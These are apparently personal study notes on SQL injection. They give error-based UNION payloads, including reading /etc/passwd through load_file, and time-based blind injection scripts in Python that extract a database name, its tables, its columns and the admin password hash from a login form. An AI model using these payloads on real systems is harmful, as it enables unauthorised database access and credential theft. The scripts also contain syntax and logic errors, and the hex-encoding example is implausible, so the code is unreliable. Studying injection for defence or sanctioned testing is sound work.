
# SQLI Error based #


Is based on errors from the server. An important concept on the sql attacks is that we need to know how many columns have the tables. 
1 - It is important to start with "order by"
2 - Follow the attack with "union select" 1,2,3,4 (or the number of columns) or NULL,NULL,NULL 
3- enumerate elements of the database. union select database(),user(),load_file('/etc/passwd'),NULL.
4- we know the name of the data base, we now can enumerate the name of the columns:
' union select 1,table_name from information_schema.tables where table_schema="databasename"
5 - We can know now the columns on the tables too: ' union select 1, column_name from information_schema.columns where table_schema="colegio" and table_name="alumnos"


6 - we can know another databases :
' union select 1,schema_name from information_schema.schemata limit 1,1;(WE CAN LIMIT THE NUMBER OF THE OUTPUT THAT WE RETRIEVE) to the next will be 2,1..3,1..ETC.



NOTE: SOMETIMES WE CANT PUT strings  ON THE QUERYS but we can transform the string to hexadecimal

```
kali>echo "Database-name" | xxd -ps
48af5e4af2698f0a
```
He says that we need to omit the 0a of the end, now on the query we put something ike this:

```
UNION SELECT 1,table_name from information_schema.tables where table_schema=0x48af5e4af2698f;
```

# SQLI time based (BLIND) #

Another ways to do this;

This will not stop, because the first letter of the database is "Colegio" is "C"  not "a"
```
select username,password from alumnos where id= 1 and if(substr(database(),1,1)='a',sleep(5),1);
```
next character 2,1 ..3,1 .. etc

So he did the same exploit that he did in other ocasion, but we are going to do it  again.


This code is to guess the name of the database
```
#!/usr/bin/python3

import requests, time, sys , signal
from pwn import *

def def_handler(sig, frame):
    log.failure("Saliendo..")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url= 'http://url00.php'
burp = {'http': 'http://127.0.0.1:8080'}# for tuneling querys on burpsuit
s = r'0123456789zxcvbnmasdfghjklñqwertyuiop'#this is improved by other tool on the other script that we did before
result=''

def check(payload):
    data_post ={
        'username': '%s' %payload
        'password': 'test'
    }
    time_start = time.time()
    content = request.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

p1= log.progress("Database")
p2= log.progress("Payload")

for i in range(0,10):
    for c in s:
       payload= "' or if (substr(database),%d,1='%c',sleep(5),1))-- -" % (i,c)
       
       p2.status ("%s" % payload)

       if check(payload):
           result += c
           p1.status("%s" result)
           break


log.info("DATABASE: %s" % payload)

```

So he discovered that the database was "admin"

Now we need to modify the code if we want to see the tables of the database.

This is the code

```
#!/usr/bin/python3

import requests, time, sys , signal
from pwn import *

def def_handler(sig, frame):
    log.failure("Saliendo..")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url= 'http://url00.php'
burp = {'http': 'http://127.0.0.1:8080'}# for tuneling querys on burpsuit
s = r'0123456789zxcvbnmasdfghjklñqwertyuiop'#this is improved by other tool on the other script that we did before
result=''

def check(payload):
    data_post ={
        'username': '%s' %payload
        'password': 'test'
    }
    time_start = time.time()
    content = request.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

p2= log.progress("Payload")
for j in range(0,3):
    p1=log.progress("Tabla(%d)" % j)
    for i in range(1,10):
        for c in s:
           payload= "' or if (substr(select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
       
               p2.status ("%s" % payload)

           if check(payload):
               result += c
               p1.status("%s" result)
               break


    p1.success("%s" % result)
    result=''

```

Now the columns

```
#!/usr/bin/python3

import requests, time, sys , signal
from pwn import *

def def_handler(sig, frame):
    log.failure("Saliendo..")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url= 'http://url00.php'
burp = {'http': 'http://127.0.0.1:8080'}# for tuneling querys on burpsuit
s = r'0123456789zxcvbnmasdfghjklñqwertyuiop'#this is improved by other tool on the other script that we did before
result=''

def check(payload):
    data_post ={
        'username': '%s' %payload
        'password': 'test'
    }
    time_start = time.time()
    content = request.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 5:
        return 1

p2= log.progress("Payload")
for j in range(0,3):
    p1=log.progress("Columna(%d)" % j)
    for i in range(1,10):
        for c in s:
           payload= "' or if (substr(select table_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
       
               p2.status ("%s" % payload)

           if check(payload):
               result += c
               p1.status("%s" result)
               break


    p1.success("%s" % result)
    result=''

```

Now the table, (the password of admin)

```
#!/usr/bin/python3

import requests, time, sys , signal
from pwn import *

def def_handler(sig, frame):
    log.failure("Saliendo..")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url= 'http://url00.php'
burp = {'http': 'http://127.0.0.1:8080'}# for tuneling querys on burpsuit
s = r'0123456789zxcvbnmasdfghjklñqwertyuiop'#this is improved by other tool on the other script that we did before
result=''

def check(payload):
    data_post ={
        'username': '%s' %payload
        'password': 'test'
    }
    time_start = time.time()
    content = request.post(url, data=data_post)
    time_end = time.time()

    if time_end - time_start > 5:
        return 1
p1=log.progress("Password")
p2= log.progress("Payload")

for i in range(1,40):
    for c in s:
        payload= "' or if (substr(select password from users where username='admin'),%d,1)='%c',sleep(5),1)-- -" % (i,c)
       
            p2.status ("%s" % payload)

            if check(payload):
               result += c
               p1.status("%s" result)
               break


    p1.success("%s" % result)
```


we can search the hash decrypt online, hashes decrypt online